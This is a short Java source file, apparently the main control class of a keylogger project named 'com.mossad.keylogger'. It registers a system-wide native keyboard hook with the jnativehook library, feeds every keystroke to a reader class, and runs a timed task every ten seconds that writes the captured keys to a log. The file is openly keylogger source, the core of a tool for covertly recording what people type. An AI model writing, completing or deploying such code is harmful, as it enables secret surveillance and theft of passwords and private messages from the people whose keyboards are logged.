package com.mossad.keylogger.logic;

import com.mossad.keylogger.reader.KeyReader;
import com.mossad.keylogger.logging.LogRecorder;
import com.mossad.keylogger.timer.WriterTask;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.util.Timer;

public class LogicFlow {

    private Timer timer;
    private WriterTask writerTask;
    private KeyReader keyReader;
    private LogRecorder logRecorder;

    public LogicFlow(){
        timer = new Timer();
        keyReader = new KeyReader();
        logRecorder = new LogRecorder();
        writerTask = new WriterTask(keyReader,logRecorder);
    }

    public void execute () throws NativeHookException {
        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(keyReader);
        timer.schedule(writerTask,1000L,10000L);
    }

    public void stop(){
        timer.cancel();;
    }


}


